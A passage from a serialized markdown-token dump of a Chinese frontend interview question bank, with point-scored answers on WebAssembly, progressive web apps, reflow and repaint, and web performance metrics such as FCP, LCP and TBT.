跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。\\n","task":false,"loose":false,"text":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","tokens":[{"type":"text","raw":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","text":"**1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","text":"  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。\\n","task":false,"loose":false,"text":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","tokens":[{"type":"text","raw":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","text":"**1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","text":"  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。\\n","task":false,"loose":false,"text":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","tokens":[{"type":"text","raw":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","text":"**1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","text":"  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","task":false,"loose":false,"text":"**1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","tokens":[{"type":"text","raw":"**1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","text":"**1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  小体积：Wasm 格式文件较小，传输高效，加载速度快。","text":"  小体积：Wasm 格式文件较小，传输高效，加载速度快。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## WebAssembly 的工作原理是什么？\\n\\n","depth":2,"text":"WebAssembly 的工作原理是什么？","tokens":[{"type":"text","raw":"WebAssembly 的工作原理是什么？","text":"WebAssembly 的工作原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。\\n- **1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。\\n- **1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。\\n- **1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。\\n","task":false,"loose":false,"text":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","tokens":[{"type":"text","raw":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","text":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","text":" 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。\\n","task":false,"loose":false,"text":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","tokens":[{"type":"text","raw":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","text":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","text":" 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。\\n","task":false,"loose":false,"text":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","tokens":[{"type":"text","raw":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","text":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","text":" 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","task":false,"loose":false,"text":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","tokens":[{"type":"text","raw":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","text":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","text":" 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是PWA？\\n\\n","depth":2,"text":"什么是PWA？","tokens":[{"type":"text","raw":"什么是PWA？","text":"什么是PWA？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"- **1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","task":false,"loose":false,"text":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","tokens":[{"type":"text","raw":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","text":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","text":" 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## PWA有那些优点？\\n\\n","depth":2,"text":"PWA有那些优点？","tokens":[{"type":"text","raw":"PWA有那些优点？","text":"PWA有那些优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（9分）\\n\\n","depth":4,"text":"解答（9分）","tokens":[{"type":"text","raw":"解答（9分）","text":"解答（9分）","escaped":false}]},{"type":"list","raw":"- **1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快\\n- **1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。\\n- **1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本\\n- **1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。\\n- **1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。\\n- **1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。\\n- **1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。\\n- **1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。\\n- **1：** 绕过应用商店","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快\\n","task":false,"loose":false,"text":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","tokens":[{"type":"text","raw":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","text":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","text":" 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。\\n","task":false,"loose":false,"text":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","tokens":[{"type":"text","raw":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","text":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","text":" 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本\\n","task":false,"loose":false,"text":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","tokens":[{"type":"text","raw":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","text":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","text":" 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。\\n","task":false,"loose":false,"text":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","tokens":[{"type":"text","raw":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","text":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","text":" 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。\\n","task":false,"loose":false,"text":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","tokens":[{"type":"text","raw":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","text":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","text":" SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。\\n","task":false,"loose":false,"text":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","tokens":[{"type":"text","raw":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","text":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","text":" 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。\\n","task":false,"loose":false,"text":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","tokens":[{"type":"text","raw":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","text":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","text":" 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。\\n","task":false,"loose":false,"text":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","tokens":[{"type":"text","raw":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","text":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","text":" 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 绕过应用商店","task":false,"loose":false,"text":"**1：** 绕过应用商店","tokens":[{"type":"text","raw":"**1：** 绕过应用商店","text":"**1：** 绕过应用商店","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 绕过应用商店","text":" 绕过应用商店","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## PWA有什么缺点？\\n\\n","depth":2,"text":"PWA有什么缺点？","tokens":[{"type":"text","raw":"PWA有什么缺点？","text":"PWA有什么缺点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"- **1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。\\n- **1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。\\n- **1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。\\n","task":false,"loose":false,"text":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","tokens":[{"type":"text","raw":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","text":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","text":" 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。\\n","task":false,"loose":false,"text":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","tokens":[{"type":"text","raw":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","text":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","text":" 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","task":false,"loose":false,"text":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","tokens":[{"type":"text","raw":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","text":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","text":" 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","escaped":false}]}]}]}]},{"key":"前端性能优化","content":"<h1>前端性能优化</h1>\\n<h2>回流重绘</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 回流：浏览器渲染页面之前需要对结构进行布局计算</p>\\n</li>\\n<li><p><strong>1：</strong> 重绘：将已经计算好布局的容器绘制出来</p>\\n</li>\\n<li><p><strong>1：</strong> 触发回流：页面上有容器的几何属性发生变更</p>\\n</li>\\n<li><p><strong>1：</strong> 触发重绘：容器非几何属性变更 （字体，颜色）</p>\\n</li>\\n<li><p><strong>1：</strong> 回流必定重绘，重绘不一定回流</p>\\n</li>\\n</ul>\\n<h2>前端性能指标有哪些？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（11 分）</h4>\\n<ul>\\n<li><strong>1：</strong> FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。</li>\\n<li><strong>1：</strong> LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。</li>\\n<li><strong>1：</strong> TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。</li>\\n<li><strong>1：</strong> TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。</li>\\n<li><strong>1：</strong> FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。</li>\\n<li><strong>1：</strong> FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 